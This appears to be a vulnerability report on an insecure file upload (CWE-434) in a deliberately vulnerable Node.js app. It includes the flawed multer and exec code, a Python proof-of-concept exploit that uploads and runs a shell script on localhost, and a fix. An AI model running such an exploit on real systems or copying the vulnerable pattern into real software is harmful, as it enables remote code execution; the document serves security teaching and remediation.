# Vulnerability: Insecure File Upload

## 1. Vulnerability Name
**CWE-434: Unrestricted Upload of File with Dangerous Type**

## 2. Location in Code
- **File:** `backend/src/routes/documents.js` (lines 18-28)
- **File:** `backend/src/routes/fileExecution.js` (lines 8-25)

```javascript
// documents.js - No file type validation
const upload = multer({ 
    storage,
    limits: { 
        fileSize: 100 * 1024 * 1024, // 100MB
        files: 999
    },
    // VULNERABILITY: Accept ALL file types including executables
    fileFilter: (req, file, cb) => {
        // Accept everything - no validation
        cb(null, true);
    }
});

// fileExecution.js - File execution endpoint
router.post('/execute/:filename', auth, async (req, res) => {
    const { filename } = req.params;
    const filePath = path.join(__dirname, '..', 'uploads', filename);
    
    if (fs.existsSync(filePath)) {
        const command = `${filePath} ${args}`;
        exec(command, (error, stdout, stderr) => {
            // Execute uploaded files
        });
    }
});
```

## 3. Technical Root Cause
The application accepts file uploads without validating file types, extensions, or content. This allows attackers to upload executable files, scripts, or malicious content that can be executed on the server or downloaded by other users.

## 4. Proof of Concept Explanation
1. Create a malicious executable file (e.g., shell script, PHP file)
2. Upload the file through the document upload endpoint
3. Access the uploaded file through the file execution endpoint
4. Execute arbitrary code on the server

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import os

def exploit_file_upload():
    base_url = "http://localhost:5000"
    
    # Login to get token
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    token = response.json().get('token')
    
    if not token:
        print("[-] Login failed")
        return False
    
    # Create malicious script
    malicious_script = '''#!/bin/bash
echo "MALICIOUS CODE EXECUTED"
whoami
pwd
ls -la
'''
    
    script_path = "malicious.sh"
    with open(script_path, 'w') as f:
        f.write(malicious_script)
    
    # Upload malicious file
    headers = {"Authorization": f"Bearer {token}"}
    
    with open(script_path, 'rb') as f:
        files = {'file': ('malicious.sh', f, 'application/x-sh')}
        upload_response = requests.post(
            f"{base_url}/api/documents/upload",
            headers=headers,
            files=files
        )
    
    if upload_response.status_code == 201:
        print("[+] Malicious file uploaded successfully")
        document_data = upload_response.json()
        file_path = document_data.get('path')
        
        # Try to execute the uploaded file
        exec_response = requests.post(
            f"{base_url}/api/execute",
            headers=headers,
            json={"filePath": file_path}
        )
        
        if exec_response.status_code == 200:
            print("[!] FILE UPLOAD VULNERABILITY CONFIRMED")
            print("[+] Malicious file executed on server")
            print(f"[+] Execution output: {exec_response.json()}")
            
            # Cleanup
            os.remove(script_path)
            return True
    
    # Cleanup
    if os.path.exists(script_path):
        os.remove(script_path)
    
    return False

if __name__ == "__main__":
    exploit_file_upload()
```

## 6. Impact
- **Remote Code Execution:** Arbitrary command execution on the server
- **System Compromise:** Full server takeover potential
- **Data Exfiltration:** Access to sensitive server files and databases
- **Malware Distribution:** Platform becomes vector for malware spread

**CVSS Score:** 9.8 (Critical)

## 7. Fix Recommendation

Implement comprehensive file validation:

```javascript
// Secure file upload implementation
const path = require('path');
const crypto = require('crypto');

const ALLOWED_EXTENSIONS = ['.pdf', '.doc', '.docx', '.txt', '.jpg', '.png'];
const ALLOWED_MIME_TYPES = [
    'application/pdf',
    'application/msword',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'text/plain',
    'image/jpeg',
    'image/png'
];

const secureUpload = multer({
    dest: 'uploads/',
    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB limit
    fileFilter: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        
        if (!ALLOWED_EXTENSIONS.includes(ext)) {
            return cb(new Error('File type not allowed'));
        }
        
        if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
            return cb(new Error('MIME type not allowed'));
        }
        
        cb(null, true);
    }
});

router.post('/upload', authenticateToken, secureUpload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ message: 'No file uploaded' });
        }
        
        // Generate secure filename
        const fileExt = path.extname(req.file.originalname);
        const secureFilename = crypto.randomUUID() + fileExt;
        
        // Additional content validation here
        
        const document = new Document({
            filename: req.file.originalname,
            secureFilename: secureFilename,
            path: req.file.path,
            userId: req.user.id,
            tenantId: req.user.tenantId,
            mimeType: req.file.mimetype,
            size: req.file.size
        });
        
        await document.save();
        res.status(201).json(document);
    } catch (error) {
        res.status(500).json({ message: 'Upload failed' });
    }
});

// Remove file execution endpoint entirely
```